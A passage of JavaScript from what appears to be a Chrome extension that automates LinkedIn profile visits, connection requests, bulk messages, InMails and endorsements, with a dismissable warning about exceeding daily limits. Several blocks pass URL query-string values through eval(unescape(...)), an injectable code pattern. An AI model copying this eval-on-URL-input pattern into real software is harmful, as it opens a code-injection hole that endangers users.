                                    // $("#selFollUpMes option[value='"+local_data.selectedFollowUpMessage+"']").attr("selected","true");
                                    // $("#selFollUpMes").trigger("change");
                                } else {
                                    $("#fol_div .template_selection").val("custom").trigger("change");
                                    $("#custom_fol_msg").val(local_data.selectedFollowUpMessage);
                                }
                            }
                            if ($("[name=autoFollowUp]").length > 0 && local_data.autoFollowUp) {
                                $("#value_"+local_data.autoFollowUp).click();
                            }
                            if (local_data.rcr > -1) {
                                $("#remaining_conn_req").val(local_data.rcr).trigger("input");
                            }
                            if (local_data.rpv > -1) {
                                $("#remaining").val(local_data.rpv).trigger("input");
                            }
                        });
                    }
                    if (selected_tab == 'visit_profiles') {
                        populateViews("true", function() {
                            if (local_data.startedViewing) {
                                $("#start_viewing").text("STOP");
                                $("#start_viewing").addClass("started");
                                setStopLeonardBtn(true);
                            }
                            if (local_data.rpv > -1) {
                                $("#remaining").val(local_data.rpv).trigger("input");
                            }
                        });
                    }
                    if (selected_tab == 'scan_profiles') {
                        populateViews("true", function() {
                            if (local_data.startedViewing) {
                                $("#start_scanning").text("STOP");
                                $("#start_scanning").addClass("started");
                                setStopLeonardBtn(true);
                            }
                            if (local_data.rpv > -1) {
                                $("#remaining").val(local_data.rpv).trigger("input");
                            }
                        });
                    }
                    if (selected_tab == 'message') {
                        var facetArr = [];
                        var isSavedSearch = location.search.indexOf('savedSearchId') >= 0 ? true : false;
                        if(isSavedSearch){
                            if(isSalesNav){
                                $(".facet-list > li").map(function(){
                                    var facetVal = $(this).find(".selected-value-pill[data-value]").map(function(){
                                        return $(this).attr("data-value")
                                    }).toArray();
                                    var facetKey = $(this).attr('class').replace('facet ','');
                                    if ( facetVal && facetVal.length > 0 && facetKey == 'N'){
                                        facetArr.push(facetVal);
                                    }
                                })
                            }
                        } else {
                            if(isSalesNav){
                                location.search.split('&').forEach(function(e){
                                    if(e.indexOf('facet.N') >= 0){
                                        facetArr.push(e.split('=')[1]);
                                    }
                                })
                            } else {
                                location.search.split('&').forEach(function(e){
                                    if(e.match('facetNetwork')){
                                        facetArr = eval(unescape(e).split("=")[1]);
                                    }
                                })
                            }
                        }
                        if ( (
                            ( search_records_count > 0 || ( !isSalesNav && $("#sf-facetNetwork-F").is(":checked") && !$("#sf-facetNetwork-S").is(":checked") && !$("#sf-facetNetwork-O").is(":checked") ) ) ||
                            ( search_records_count > 0 || ( isSalesNav && facetArr.indexOf('F') >= 0 && facetArr.indexOf('S') == -1 && facetArr.indexOf('O') == -1 ) )
                            ) && search_records_count > 0 ) {
                            populateMessages(true, function() {
                                if (local_data.startedMessaging) {
                                    $("#start_sending_msg").text("STOP");
                                    $("#start_sending_msg").addClass("started");
                                    setStopLeonardBtn(true);
                                }
                                if ($("#selMes").length > 0 && local_data.selectedMessage) {
                                    if ($("#selMes option[value='" + local_data.selectedMessage + "']").length > 0) {
                                        $("#msg_div .template_selection").val("saved").trigger("change");
                                        $("#selMes option[value='" + local_data.selectedMessage + "']").attr("selected", "true");
                                        // $("#selMes").trigger("change");
                                    } else {
                                        $("#msg_div .template_selection").val("custom").trigger("change");
                                        $("#custom_msg").val(local_data.selectedMessage);
                                    }
                                }
                                if (local_data.rm) {
                                    $("#remaining_msg_req").val(local_data.rm).trigger("input");
                                }
                            })
                            $(".leo-notice").removeClass("error");
                        } else {
                            // showNotification("Please select 1st connections only");
                            $(".leo-notice").addClass("error");
                            populateMessages();
                            // return false;
                        }
                    }
                    if (isSalesNav && selected_tab == 'inmail') {       // not enabled for global search
                        var facetArr = [];
                        var isSavedSearch = location.search.indexOf('savedSearchId') >= 0 ? true : false;
                        if(isSavedSearch){
                            if(isSalesNav){
                                $(".facet-list > li").map(function(){
                                    var facetVal = $(this).find(".selected-value-pill[data-value]").map(function(){
                                        return $(this).attr("data-value")
                                    }).toArray();
                                    var facetKey = $(this).attr('class').replace('facet ','');
                                    if ( facetVal && facetVal.length > 0 && facetKey == 'N'){
                                        facetArr.push(facetVal);
                                    }
                                })
                            }
                        } else {
                            if(isSalesNav){
                                location.search.split('&').forEach(function(e){
                                    if(e.indexOf('facet.N') >= 0){
                                        facetArr.push(e.split('=')[1]);
                                    }
                                })
                            } else {
                                location.search.split('&').forEach(function(e){
                                    if(e.match('facetNetwork')){
                                        facetArr = eval(unescape(e).split("=")[1]);
                                    }
                                })
                            }
                        }
                        if ( (
                            ( search_records_count > 0 || ( !isSalesNav && ( $("#sf-facetNetwork-F").is(":checked") || $("#sf-facetNetwork-S").is(":checked") || $("#sf-facetNetwork-O").is(":checked") ) ) ) ||
                            ( search_records_count > 0 || ( isSalesNav && ( facetArr.indexOf('F') >= 0 || facetArr.indexOf('S') >= 0 || facetArr.indexOf('O') >= 0 || facetArr.indexOf('A') >= 0 ) ) )
                            ) && search_records_count > 0) {
                            populateInMails(true, function() {
                                if (local_data.startedMailing) {
                                    $("#start_sending_inm").text("STOP");
                                    $("#start_sending_inm").addClass("started");
                                    setStopLeonardBtn(true);
                                }
                                if ($("#selInm").length > 0 && local_data.selectedInMail) {
                                    if ($("#selInm option[value='" + local_data.selectedInMail + "']").length > 0) {
                                        $("#inm_div .template_selection").val("saved").trigger("change");
                                        $("#selInm option[value='" + local_data.selectedInMail + "']").attr("selected", "true");
                                    } else {
                                        $("#inm_div .template_selection").val("custom").trigger("change");
                                        $("#custom_inm").val(local_data.selectedInMail);
                                        $("#custom_inm_subject").val(local_data.selectedInMailSubject);
                                    }
                                }
                                if (local_data.rim) {
                                    $("#remaining_inm_req").val(local_data.rim).trigger("input");
                                }
                            })
                        } else {
                            showNotification(local_strings['SELECT_RELATION']);
                            populateInMails();
                            // return false;
                        }
                    }
                    $('body').off('click');
                    $('body').on('click', function(e) {
                        if ($(e.target).data('toggle') !== 'popover' &&
                            $(e.target).parents('#leo_connect_warn').length == 0 &&
                            $(e.target).parents('[data-toggle="popover"]').length === 0 &&
                            $(e.target).parents('.popover.in').length === 0 && !$(e.target).hasClass("select2-selection__choice__remove")) {
                            $(that).popover('hide');
                            if(!local_data.startedMessaging){
                                local_data.selectedMessageAttachments = [];
                            }
                            if(!local_data.startedMailing){
                                local_data.selectedInMailAttachments = [];
                            }
                            if(!local_data.startedSending){
                                local_data.selectedInvitationMessage = false;
                                local_data.selectedFollowUpMessage = false;
                            }
                            local_data.selectedTags = false;
                            $(".file_list_ul").html('');
                            var data = $(that).data("bs.popover");
                            data.inState.click = false;
                            $(that).data("bs.popover", data);
                            e.preventDefault();
                            e.stopPropagation();
                            e.stopImmediatePropagation();
                            $('body').off('click');
                        }
                    });
                });
                // $(".leo_container > table").hide();
                // $("#" + selected_tab).show();
            }
            if(initializingPopups){
                return false;
            }
            switch (selected_tab) {
                case 'connection_invitation':
                    populateTemplates(true, function() {
                        if (local_data.startedSending) {
                            $("#start_sending_conn").text("STOP");
                            $("#start_sending_conn").addClass("started");
                            setStopLeonardBtn(true);
                        }
                        if (local_data.startedViewing) {
                            $("#start_viewing").text("STOP");
                            $("#start_viewing").addClass("started");
                            setStopLeonardBtn(true);
                        }
                        var selectedInvitationMessageId = false;
                        if(local_data.selectedInvitationMessage){
                            selectedInvitationMessageId = invitationMessages.filter(x=>x.template_content == local_data.selectedInvitationMessage)[0].id;
                        }
                        if ($("#selInvMes").length > 0 && local_data.selectedInvitationMessage && selectedInvitationMessageId) {
                            if ($("#selInvMes option[value='" + selectedInvitationMessageId + "']").length > 0) {
                                $("#inv_div .template_selection").val("saved").trigger("change");
                                $("#selInvMes option[value='" + selectedInvitationMessageId + "']").attr("selected", "true");
                                // $("#selInvMes").trigger("change");
                            } else {
                                $("#inv_div .template_selection").val("custom").trigger("change");
                                $("#custom_inv_msg").val(local_data.selectedInvitationMessage);
                            }
                        }
                        var selectedFollowUpMessageId = false;
                        if(local_data.selectedFollowUpMessage){
                            selectedFollowUpMessageId = followUpMessages.filter(x=>x.template_content == local_data.selectedFollowUpMessage)[0].id;
                        }
                        if ($("#selFollUpMes").length > 0 && local_data.selectedFollowUpMessage && selectedFollowUpMessageId) {
                            if ($("#selFollUpMes option[value='" + selectedFollowUpMessageId + "']").length > 0) {
                                $("#fol_div .template_selection").val("saved").trigger("change");
                                $("#selFollUpMes option[value='" + selectedFollowUpMessageId + "']").attr("selected", "true");
                                // $("#selFollUpMes").trigger("change");
                            } else {
                                $("#fol_div .template_selection").val("custom").trigger("change");
                                $("#custom_fol_msg").val(local_data.selectedFollowUpMessage);
                            }
                        }
                        if ($("[name=autoFollowUp]").length > 0 && local_data.autoFollowUp) {
                            $("#value_"+local_data.autoFollowUp).click();
                        }
                        if ($("#conn_inv_tags").length > 0 && local_data.selectedTags) {
                            local_data.selectedTags.forEach(function(t) {
                                if ($("#conn_inv_tags option[value='" + t + "']").length > 0) {
                                    $("#conn_inv_tags option[value='" + t + "']").attr("selected", "true");
                                }
                            })
                        }
                    });
                    break;
                case 'message':
                    var facetArr = [];
                    var isSavedSearch = location.search.indexOf('savedSearchId') >= 0 ? true : false;
                    if(isSavedSearch){
                        if(isSalesNav){
                            $(".facet-list > li").map(function(){
                                var facetVal = $(this).find(".selected-value-pill[data-value]").map(function(){
                                    return $(this).attr("data-value")
                                }).toArray();
                                var facetKey = $(this).attr('class').replace('facet ','');
                                if ( facetVal && facetVal.length > 0 && facetKey == 'N'){
                                    facetArr.push(facetVal);
                                }
                            })
                        }
                    } else {
                        if(isSalesNav){
                            location.search.split('&').forEach(function(e){
                                if(e.indexOf('facet.N') >= 0){
                                    facetArr.push(e.split('=')[1]);
                                }
                            })
                        } else {
                            location.search.split('&').forEach(function(e){
                                if(e.match('facetNetwork')){
                                    facetArr = eval(unescape(e).split("=")[1]);
                                }
                            })
                        }
                    }
                    if ( (
                        ( search_records_count > 0 || ( !isSalesNav && $("#sf-facetNetwork-F").is(":checked") && !$("#sf-facetNetwork-S").is(":checked") && !$("#sf-facetNetwork-O").is(":checked") ) ) ||
                        ( search_records_count > 0 || ( isSalesNav && facetArr.indexOf('F') >= 0 && facetArr.indexOf('S') == -1 && facetArr.indexOf('O') == -1) )
                        ) && search_records_count > 0 ) {
                        populateMessages(true, function() {
                            if (local_data.startedMessaging) {
                                $("#start_sending_msg").text("STOP");
                                $("#start_sending_msg").addClass("started");
                                setStopLeonardBtn(true);
                            }
                            if ($("#selMes").length > 0 && local_data.selectedMessage) {
                                if ($("#selMes option[value='" + local_data.selectedMessage + "']").length > 0) {
                                    $("#msg_div .template_selection").val("saved").trigger("change");
                                    $("#selMes option[value='" + local_data.selectedMessage + "']").attr("selected", "true");
                                    // $("#selMes").trigger("change");
                                } else {
                                    $("#msg_div .template_selection").val("custom").trigger("change");
                                    $("#custom_msg").val(local_data.selectedMessage);
                                }
                            }
                            if (local_data.rm) {
                                $("#remaining_msg_req").val(local_data.rm).trigger("input");
                            }
                        })
                        $(".leo-notice").removeClass("error");
                    } else {
                        // showNotification("Please select 1st connections only");
                        $(".leo-notice").addClass("error");
                        populateMessages();
                        // return false;
                    }
                    break;
                case 'inmail':
                    var facetArr = [];
                    var isSavedSearch = location.search.indexOf('savedSearchId') >= 0 ? true : false;
                    if(isSavedSearch){
                        if(isSalesNav){
                            $(".facet-list > li").map(function(){
                                var facetVal = $(this).find(".selected-value-pill[data-value]").map(function(){
                                    return $(this).attr("data-value")
                                }).toArray();
                                var facetKey = $(this).attr('class').replace('facet ','');
                                if ( facetVal && facetVal.length > 0 && facetKey == 'N'){
                                    facetArr.push(facetVal);
                                }
                            })
                        }
                    } else {
                        if(isSalesNav){
                            location.search.split('&').forEach(function(e){
                                if(e.indexOf('facet.N') >= 0){
                                    facetArr.push(e.split('=')[1]);
                                }
                            })
                        } else {
                            location.search.split('&').forEach(function(e){
                                if(e.match('facetNetwork')){
                                    facetArr = eval(unescape(e).split("=")[1]);
                                }
                            })
                        }
                    }
                    if ( (
                        ( search_records_count > 0 || ( !isSalesNav && ( $("#sf-facetNetwork-F").is(":checked") || $("#sf-facetNetwork-S").is(":checked") || $("#sf-facetNetwork-O").is(":checked") ) ) ) ||
                        ( search_records_count > 0 || ( isSalesNav && ( facetArr.indexOf('F') >= 0 || facetArr.indexOf('S') >= 0 || facetArr.indexOf('O') >= 0 || facetArr.indexOf('A') >= 0 ) ) )
                        ) && search_records_count > 0) {
                        populateInMails(true, function() {
                            if (local_data.startedMailing) {
                                $("#start_sending_inm").text("STOP");
                                $("#start_sending_inm").addClass("started");
                                setStopLeonardBtn(true);
                            }
                            if ($("#selInm").length > 0 && local_data.selectedInMail) {
                                if ($("#selInm option[value='" + local_data.selectedInMail + "']").length > 0) {
                                    $("#inm_div .template_selection").val("saved").trigger("change");
                                    $("#selInm option[value='" + local_data.selectedInMail + "']").attr("selected", "true");
                                } else {
                                    $("#inm_div .template_selection").val("custom").trigger("change");
                                    $("#custom_inm").val(local_data.selectedInMail);
                                    $("#custom_inm_subject").val(local_data.selectedInMailSubject);
                                }
                            }
                            if (local_data.rim) {
                                $("#remaining_inm_req").val(local_data.rim).trigger("input");
                            }
                        })
                    } else {
                        showNotification("Please select relationship!");
                        populateInMails();
                        // return false;
                    }
                    break;
                case 'go_to_crm':
                    chrome.runtime.sendMessage({
                        open_new_tab: true,
                        url: chrome.runtime.getURL('CRM/index.html')
                    });
                    break;
            }
        });
        chrome.storage.local.get('sales_tab', function(o) {
            if (o && o.sales_tab) {
                $(".leo_nav li:eq('" + o.sales_tab + "')").click();
            } else {
                initializingPopups = true;
                $(".leo_nav li:not(:last)").click();
                $(".leo_nav li.active").removeClass("active");
                initializingPopups = false;
            }
        })
        if (local_data.REMAINING_PROFILE_VIEWS == 0) {
            $("#range_slider").attr("min", "0").rangeslider('update', true).trigger("input");
        }
        if (local_data.REMAINING_CONNECTION_REQUESTS == 0) {
            $("#conn_range_slider").attr("min", "0").rangeslider('update', true).trigger("input");
        }
        if(typeof callback == 'function'){
            callback(true);
        }
    });
}

function displayAttachments(files_list, att_type){
    var li_temp = '<li class="file-block"><div class="file_details_cont"><span class="file_name">#FILENAME#</span><span class="file_size">(#FILESIZE#)</span><span class="remove-file" data-attachment-type="'+att_type+'" data-file-index="#FILEIDX#"></span></div></li>';
    $(".file_list_ul").html('');
    if(files_list.length > 0){
        files_list.forEach(function(f, idx){
            var fileSize = getSizeInBytes(f.size, 2);
            var newLI = li_temp.slice(0).replace(/#FILENAME#/g, f.name).replace(/#FILESIZE#/g, fileSize).replace(/#FILEIDX#/g, idx);
            $(".file_list_ul").append(newLI);
        });
        $(".file_list").show();
    } else {
        $(".file_list").hide();
    }
    $(".remove-file").unbind("click");
    $(".remove-file").bind("click", function(e){
        var idx = $(this).attr("data-file-index");
        var attachment_type = $(this).attr("data-attachment-type");
        local_data[attachment_type].splice(idx, 1);
        displayAttachments(local_data[attachment_type], attachment_type);
        e.preventDefault();
        e.stopPropagation();
        e.stopImmediatePropagation();
    });
}

function addListenerToTemplate() {
    $("#start_viewing").unbind("click");
    $("#start_viewing").bind("click", function() {
        if (local_data.REMAINING_PROFILE_VIEWS <= 0) {
            local_data.REMAINING_PROFILE_VIEWS = 0;
            showNotification(local_strings['DAILY_VIEWS_COMPLETED']);
            return false;
        }
        if ($("#start_viewing").hasClass("started")) {
            $("#start_viewing").text(local_strings['START']);
            $("#start_viewing").removeClass("started");
            setStopLeonardBtn(false);
            clearInterval(nextViewInter);
            nextViewInter = null;
            clearTimeout(nextViewTimer);
            nextViewTimer = null;
            $(".leo_visiting").find(".time_rem_span").remove()
            $(".leo_visiting").removeClass("leo_visiting");
            chrome.runtime.sendMessage({
                removeBadge: true
            });
            chrome.storage.local.set({
                nextPageRedirect: false
            });
            local_data.rpv = local_data.REMAINING_PROFILE_VIEWS;
            local_data.startedViewing = false;
            // saveLocalData();
        } else {
            var continueMethod = function(){
                local_data.startedViewing = true;
                local_data.rpv = parseInt($("#range_slider").val());
                $("#start_viewing").text(local_strings['STOP']);
                $("#start_viewing").addClass("started");
                setStopLeonardBtn(true);
                finished_in_remaining = 0;
                local_data.currentIdx = 0;
                currentIdx = 0;
                leonard_stopped = false;
                authorizeByPlan(function(){
                    closePopup();
                    startViewing();
                })
            }

            var countSel = parseInt($("#range_slider").val());
            getAccountType(function(account_type){
                if(account_type == 'Sales Navigator'){
                    continueMethod();
                } else {
                    local_data.account_type = account_type;
                    var maxViewLimit = account_type == 'Sales Navigator' ? 200 : account_type == 'Premium' ? 100 : 50;
                    maxViewLimit++;
                    chrome.storage.local.get('dont_show_connect_warning', function(settings){
                        if(!settings.dont_show_connect_warning && countSel >= maxViewLimit){
                            var connect_warn_html = $('<div />',{id:'leo_connect_warn'});
                            $('<div />',{id:'leo_gray_overlay'}).appendTo(connect_warn_html);
                            var connect_warn_text = $('<div />',{id:'leo_warn_text'});
                            connect_warn_text.append($('<div />',{class:'leo_para',style:'width: 75px;'}).html('<img src="'+chrome.runtime.getURL('images/logo.png')+'" width="64" />'));
                            var connect_warn_text_p = $('<div />',{class:'leo_para',style:'width: calc(100% - 115px);'});
                            connect_warn_text_p.append($('<div />').text('Hey '+user_details.firstname+','));
                            if (account_type == 'Sales Navigator') {
                                connect_warn_text_p.append($('<div />').html("I detected you have a <strong>Sales Navigator account.</strong>"));
                            } else if(account_type == 'Premium'){
                                connect_warn_text_p.append($('<div />').html('I detected you have a <strong>Premium LinkedIn membership.</strong>'));
                            } else if (account_type == 'Basic') {
                                connect_warn_text_p.append($('<div />').html('I detected you have a <strong>Basic LinkedIn membership.</strong>'));
                            }
                            connect_warn_text_p.append($('<div />').html('I recommend that you consider adjusting your limit for this feature to maximum of <strong>'+(maxViewLimit-1)+' per day</strong>'));
                            connect_warn_text_p.append($('<div />',{style:'margin-bottom:20px;',class:'leo_notice'}).text('Would you like to revise your activity before I proceed?'));
                            connect_warn_text.append(connect_warn_text_p);
                            var leo_btn_cont = $('<div />',{class:'leo_btn_cont'});
                            var cancelBtn = $('<button />').text("Yes. I'll review")
                            leo_btn_cont.append(cancelBtn);
                            var okBtn = $('<button />').text('Proceed. I accept the risks');
                            leo_btn_cont.append(okBtn);
                            leo_btn_cont.appendTo(connect_warn_text);
                            connect_warn_text.append($('<div />',{style:'margin-left: 85px;margin-top: 20px;float: left;'}).html('<div class="squaredThree" style="margin:0 0 20px 0;"><input type="checkbox" id="dont_show"><label for="dont_show">Don\'t show this warning again.</label></div>'));
                            connect_warn_text.appendTo(connect_warn_html);
                            connect_warn_html.appendTo($('body'));
                            cancelBtn.bind('click', function(){
                                $("#leo_connect_warn").remove();
                            });
                            okBtn.bind('click', function(){
                                $("#leo_connect_warn").remove();
                                continueMethod();
                            });
                            $("#dont_show").bind("change", function(){
                                var checked_val = $(this).is(":checked");
                                chrome.storage.local.set({'dont_show_connect_warning': checked_val});
                            })
                        } else {
                            continueMethod();
                        }
                    })
                }
            })
        }
    });

    $("#view_premium_only").prop("checked", viewPremiumOnly);

    $("#view_premium_only").unbind("change");
    $("#view_premium_only").bind("change", function() {
        if ($("#view_premium_only").is(":checked")) {
            viewPremiumOnly = true;
        } else {
            viewPremiumOnly = false;
        }
        chrome.storage.local.set({
            "view_premium_only": viewPremiumOnly
        });
    });

    $("#start_scanning").unbind("click");
    $("#start_scanning").bind("click", function() {
        if (local_data.REMAINING_PROFILE_VIEWS <= 0) {
            local_data.REMAINING_PROFILE_VIEWS = 0;
            showNotification(local_strings['DAILY_VIEWS_COMPLETED']);
            return false;
        }
        if ($("#start_scanning").hasClass("started")) {
            $("#start_scanning").text(local_strings['START']);
            $("#start_scanning").removeClass("started");
            setStopLeonardBtn(false);
            clearInterval(nextViewInter);
            nextViewInter = null;
            clearTimeout(nextViewTimer);
            nextViewTimer = null;
            $(".leo_visiting").find(".time_rem_span").remove()
            $(".leo_visiting").removeClass("leo_visiting");
            chrome.runtime.sendMessage({
                removeBadge: true
            });
            chrome.storage.local.set({
                nextPageRedirect: false
            });
            local_data.rpv = local_data.REMAINING_PROFILE_VIEWS;
            local_data.startedScanning = false;
            // saveLocalData();
        } else {
            local_data.startedScanning = true;
            local_data.rpv = parseInt($("#range_slider").val());
            $("#start_scanning").text(local_strings['STOP']);
            $("#start_scanning").addClass("started");
            setStopLeonardBtn(true);
            finished_in_remaining = 0;
            local_data.currentIdx = 0;
            currentIdx = 0;
            leonard_stopped = false;
            authorizeByPlan(function(){
                closePopup();
                startScanning();
            })
        }
    });

    $("#scan_premium_only").prop("checked", scanPremiumOnly);

    $("#scan_premium_only").unbind("change");
    $("#scan_premium_only").bind("change", function() {
        if ($("#scan_premium_only").is(":checked")) {
            scanPremiumOnly = true;
        } else {
            scanPremiumOnly = false;
        }
        chrome.storage.local.set({
            "scan_premium_only": scanPremiumOnly
        });
    });

    $("#connect_premium_only").prop("checked", connectPremiumOnly);

    $("#connect_premium_only").unbind("change");
    $("#connect_premium_only").bind("change", function() {
        if ($("#connect_premium_only").is(":checked")) {
            connectPremiumOnly = true;
        } else {
            connectPremiumOnly = false;
        }
        chrome.storage.local.set({
            "connect_premium_only": connectPremiumOnly
        });
    });

    $("#export_campaign_conn").prop("checked", exportCampaignConn);

    $("#export_campaign_conn").unbind("change");
    $("#export_campaign_conn").bind("change", function() {
        if ($("#export_campaign_conn").is(":checked")) {
            exportCampaignConn = true;
        } else {
            exportCampaignConn = false;
        }
        chrome.storage.local.set({
            "export_campaign_conn": exportCampaignConn
        });
    });

    $("#export_campaign_msg").prop("checked", exportCampaignMsg);

    $("#export_campaign_msg").unbind("change");
    $("#export_campaign_msg").bind("change", function() {
        if ($("#export_campaign_msg").is(":checked")) {
            exportCampaignMsg = true;
        } else {
            exportCampaignMsg = false;
        }
        chrome.storage.local.set({
            "export_campaign_msg": exportCampaignMsg
        });
    });

    $("#export_campaign_mail").prop("checked", exportCampaignMail);

    $("#export_campaign_mail").unbind("change");
    $("#export_campaign_mail").bind("change", function() {
        if ($("#export_campaign_mail").is(":checked")) {
            exportCampaignMail = true;
        } else {
            exportCampaignMail = false;
        }
        chrome.storage.local.set({
            "export_campaign_mail": exportCampaignMail
        });
    });

    $("#export_campaign_visit").prop("checked", exportCampaignVisit);

    $("#export_campaign_visit").unbind("change");
    $("#export_campaign_visit").bind("change", function() {
        if ($("#export_campaign_visit").is(":checked")) {
            exportCampaignVisit = true;
        } else {
            exportCampaignVisit = false;
        }
        chrome.storage.local.set({
            "export_campaign_visit": exportCampaignVisit
        });
    });

    $("#auto_follow_users").prop("checked", autoFollowUsers);

    $("#auto_follow_users").unbind("change");
    $("#auto_follow_users").bind("change", function() {
        if ($("#auto_follow_users").is(":checked")) {
            autoFollowUsers = true;
        } else {
            autoFollowUsers = false;
        }
        chrome.storage.local.set({
            "auto_follow_users": autoFollowUsers
        });
    });

    $("#auto_endorse_users").prop("checked", autoEndorseUsers);

    $("#auto_endorse_users").unbind("change");
    $("#auto_endorse_users").bind("change", function() {
        if ($("#auto_endorse_users").is(":checked")) {
            autoEndorseUsers = true;
        } else {
            autoEndorseUsers = false;
        }
        chrome.storage.local.set({
            "auto_endorse_users": autoEndorseUsers
        });
    });

    $("#skip_profile_with_no_pic_visit").prop("checked", skipProfileWithNoPicVisit);

    $("#skip_profile_with_no_pic_visit").unbind("change");
    $("#skip_profile_with_no_pic_visit").bind("change", function() {
        if ($("#skip_profile_with_no_pic_visit").is(":checked")) {
            skipProfileWithNoPicVisit = true;
        } else {
            skipProfileWithNoPicVisit = false;
        }
        chrome.storage.local.set({
            "skip_profile_with_no_pic_visit": skipProfileWithNoPicVisit
        });
    });

    $("#skip_profile_with_no_pic_scan").prop("checked", skipProfileWithNoPicScan);

    $("#skip_profile_with_no_pic_scan").unbind("change");
    $("#skip_profile_with_no_pic_scan").bind("change", function() {
        if ($("#skip_profile_with_no_pic_scan").is(":checked")) {
            skipProfileWithNoPicScan = true;
        } else {
            skipProfileWithNoPicScan = false;
        }
        chrome.storage.local.set({
            "skip_profile_with_no_pic_scan": skipProfileWithNoPicScan
        });
    });

    $("#skip_profile_with_no_pic_conn").prop("checked", skipProfileWithNoPicConn);

    $("#skip_profile_with_no_pic_conn").unbind("change");
    $("#skip_profile_with_no_pic_conn").bind("change", function() {
        if ($("#skip_profile_with_no_pic_conn").is(":checked")) {
            skipProfileWithNoPicConn = true;
        } else {
            skipProfileWithNoPicConn = false;
        }
        chrome.storage.local.set({
            "skip_profile_with_no_pic_conn": skipProfileWithNoPicConn
        });
    });

    $("#skip_profile_with_no_pic_msg").prop("checked", skipProfileWithNoPicMsg);

    $("#skip_profile_with_no_pic_msg").unbind("change");
    $("#skip_profile_with_no_pic_msg").bind("change", function() {
        if ($("#skip_profile_with_no_pic_msg").is(":checked")) {
            skipProfileWithNoPicMsg = true;
        } else {
            skipProfileWithNoPicMsg = false;
        }
        chrome.storage.local.set({
            "skip_profile_with_no_pic_msg": skipProfileWithNoPicMsg
        });
    });

    $("#skip_profile_with_no_pic_mail").prop("checked", skipProfileWithNoPicMail);

    $("#skip_profile_with_no_pic_mail").unbind("change");
    $("#skip_profile_with_no_pic_mail").bind("change", function() {
        if ($("#skip_profile_with_no_pic_mail").is(":checked")) {
            skipProfileWithNoPicMail = true;
        } else {
            skipProfileWithNoPicMail = false;
        }
        chrome.storage.local.set({
            "skip_profile_with_no_pic_mail": skipProfileWithNoPicMail
        });
    });

    $("#inmail_premium_only").prop("checked", inMailPremiumOnly);

    $("#inmail_premium_only").unbind("change");
    $("#inmail_premium_only").bind("change", function() {
        if ($("#inmail_premium_only").is(":checked")) {
            inMailPremiumOnly = true;
        } else {
            inMailPremiumOnly = false;
        }
        chrome.storage.local.set({
            "inmail_premium_only": inMailPremiumOnly
        });
    });

    $("#message_premium_only").prop("checked", messagePremiumOnly);

    $("#message_premium_only").unbind("change");
    $("#message_premium_only").bind("change", function() {
        if ($("#message_premium_only").is(":checked")) {
            messagePremiumOnly = true;
        } else {
            messagePremiumOnly = false;
        }
        chrome.storage.local.set({
            "message_premium_only": messagePremiumOnly
        });
    });

    $("#message_premium_only").prop("checked", messagePremiumOnly);

    $("#message_premium_only").unbind("change");
    $("#message_premium_only").bind("change", function() {
        if ($("#message_premium_only").is(":checked")) {
            messagePremiumOnly = true;
        } else {
            messagePremiumOnly = false;
        }
        chrome.storage.local.set({
            "message_premium_only": messagePremiumOnly
        });
    });

    $("#send_using_credits").prop("checked", sendUsingCredits);

    $("#send_using_credits").unbind("change");
    $("#send_using_credits").bind("change", function() {
        if ($("#send_using_credits").is(":checked")) {
            sendUsingCredits = true;
        } else {
            sendUsingCredits = false;
        }
        chrome.storage.local.set({
            "send_using_credits": sendUsingCredits
        });
    });

    $("#start_sending_msg").bind("click", function() {
        var facetArr = [];
        var isSavedSearch = location.search.indexOf('savedSearchId') >= 0 ? true : false;
        if(isSavedSearch){
            if(isSalesNav){
                $(".facet-list > li").map(function(){
                    var facetVal = $(this).find(".selected-value-pill[data-value]").map(function(){
                        return $(this).attr("data-value")
                    }).toArray();
                    var facetKey = $(this).attr('class').replace('facet ','');
                    if ( facetVal && facetVal.length > 0 && facetKey == 'N'){
                        facetArr.push(facetVal);
                    }
                })
            }
        } else {
            if(isSalesNav){
                location.search.split('&').forEach(function(e){
                    if(e.indexOf('facet.N') >= 0){
                        facetArr.push(e.split('=')[1]);
                    }
                })
            } else {
                location.search.split('&').forEach(function(e){
                    if(e.match('facetNetwork')){
                        facetArr = eval(unescape(e).split("=")[1]);
                    }
                })
            }
        }
        if ( (
            ( search_records_count > 0 || ( !isSalesNav && $("#sf-facetNetwork-F").is(":checked") && !$("#sf-facetNetwork-S").is(":checked") && !$("#sf-facetNetwork-O").is(":checked") ) ) ||
            ( search_records_count > 0 || ( isSalesNav && facetArr.indexOf('F') >= 0 && facetArr.indexOf('S') == -1 && facetArr.indexOf('O') == -1) )
            ) && search_records_count > 0 ) {
            var sel_msg_type = $("#msg_div .template_selection").val();
            if (sel_msg_type == 'custom') {
                var custom_msg_text = $("#custom_msg").val();
                if (!custom_msg_text) {
                    showNotification(local_strings['ENTER_CUSTOM_MSG']);
                    return false;
                } else {
                    local_data.selectedMessage = custom_msg_text;
                }
            }
            if (!local_data.selectedMessage) {
                showNotification(local_strings['SELECT_MSG']);
                return false;
            }
            if (local_data.REMAINING_MESSAGES <= 0) {
                local_data.REMAINING_MESSAGES = 0;
                showNotification(local_strings['MAX_MSG_SENT']);
                return false;
            }
            if ($("#start_sending_msg").hasClass("started")) {
                $("#start_sending_msg").text(local_strings['SEND']);
                $("#start_sending_msg").removeClass("started");
                setStopLeonardBtn(false);
                clearInterval(nextViewInter);
                nextViewInter = null;
                clearTimeout(nextViewTimer);
                nextViewTimer = null;
                $(".leo_visiting").find(".time_rem_span").remove();
                $(".leo_visiting").removeClass("leo_visiting");
                chrome.runtime.sendMessage({
                    removeBadge: true
                });
                chrome.storage.local.set({
                    nextPageRedirect: false
                });
                local_data.rm = local_data.REMAINING_MESSAGES;
                local_data.startedMessaging = false;
            } else {
                var continueMethod = function(){
                    local_data.startedMessaging = true;
                    local_data.rm = parseInt($("#msg_range_slider").val());
                    $("#start_sending_msg").text(local_strings['STOP']);
                    $("#start_sending_msg").addClass("started");
                    setStopLeonardBtn(true);
                    finished_msgs_in_remaining = 0;
                    local_data.currentIdx = 0;
                    currentIdx = 0;
                    leonard_stopped = false;
                    closePopup();
                    startMessaging();
                }
                var countSel = parseInt($("#msg_range_slider").val());
                getAccountType(function(account_type){
                    if(account_type == 'Sales Navigator'){
                        continueMethod();
                    } else {
                        local_data.account_type = account_type;
                        var maxMsgLimit = account_type == 'Sales Navigator' ? 100 : account_type == 'Premium' ? 50 : 25;
                        maxMsgLimit++;
                        chrome.storage.local.get('dont_show_connect_warning', function(settings){
                            if(!settings.dont_show_connect_warning && countSel >= maxMsgLimit){
                                var connect_warn_html = $('<div />',{id:'leo_connect_warn'});
